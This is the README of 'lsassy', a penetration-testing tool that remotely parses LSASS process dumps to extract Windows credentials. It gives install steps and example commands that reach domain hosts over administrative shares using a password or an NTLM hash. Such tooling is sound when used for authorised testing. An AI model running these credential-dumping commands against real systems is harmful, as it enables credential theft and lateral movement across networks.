# lsassy

Python library to remotely parse lsass dump.

# Requirements

* Python >= 3.6
* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0
* [impacket](https://github.com/SecureAuthCorp/impacket)

# Basic Usage

```
lsassy [<domain>/]<user>[:<password>]@<target>:/shareName/path/to/lsass.dmp
```

`-h` for all options


# Examples

```
lsassy ADSEC.LOCAL/jsnow:Winter_is_coming_\!@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp

lsassy Administrateur:952c28bd2fd728898411b301475009b7@desktop01.adsec.local:/ADMIN$/lsass.dmp
```


# Installing

## From pip

```
pip3 install lsassy
```

## From sources

```
python3 setup.py install
```